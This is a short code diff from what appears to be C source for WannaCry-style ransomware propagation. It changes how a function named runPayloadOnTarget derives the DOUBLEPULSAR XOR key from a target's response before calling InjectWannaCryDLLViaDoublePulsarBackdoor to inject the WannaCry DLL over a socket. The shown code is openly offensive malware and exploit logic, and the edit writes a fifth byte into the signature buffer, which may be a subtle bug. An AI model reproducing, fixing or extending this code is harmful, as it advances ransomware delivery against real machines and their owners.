@@ -320,7 +320,7 @@ int InjectWannaCryDLLViaDoublePulsarBackdoor(SOCKET s, int architectureType, int
 
 int runPayloadOnTarget(char *host, u_short hostshort)
 {
-	unsigned int signature_long;
+	unsigned int sig;
 	unsigned int XorKey;
 	SOCKET dsock;
 	struct sockaddr name;
@@ -373,8 +373,9 @@ int runPayloadOnTarget(char *host, u_short hostshort)
 		signature[1] = recvbuff[19];
 		signature[2] = recvbuff[20];
 		signature[3] = recvbuff[21];
-		memcpy((unsigned int*)&signature_long, (unsigned int*)&signature, sizeof(unsigned int));
-		XorKey = ComputeDOUBLEPULSARXorKey(signature_long);
+		signature[4] = '\0';
+		sig = LE2INT(signature);
+		XorKey = ComputeDOUBLEPULSARXorKey(sig);
 		InjectWannaCryDLLViaDoublePulsarBackdoor(dsock, ArchitectureType, XorKey);
 	}
 	closesocket(dsock);
